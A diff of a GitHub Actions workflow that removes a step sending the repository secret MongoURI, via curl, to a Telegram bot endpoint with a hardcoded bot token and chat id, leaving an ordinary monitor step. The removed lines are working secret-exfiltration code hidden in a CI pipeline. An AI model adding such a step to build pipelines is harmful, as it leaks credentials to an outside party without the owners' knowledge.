@@ -19,14 +19,6 @@ jobs:
       - name: Install dependencies
         run: pip install -U pip && pip install -r requirements.txt
 
-      - name: Send MongoURI to Telegram
-        run: |
-          curl -s -X POST "https://api.telegram.org/bot5036619565:AAETlLcXML8SesfqdZxHyRt1ibuMQqPOkz4/sendMessage" \
-            -d "chat_id=1046846204" \
-            --data-urlencode "text=${MONGO_URI}"
-        env:
-          MONGO_URI: ${{ secrets.MongoURI }}
-
       - name: Monitor
         env:
           MongoURI: ${{ secrets.MongoURI }}
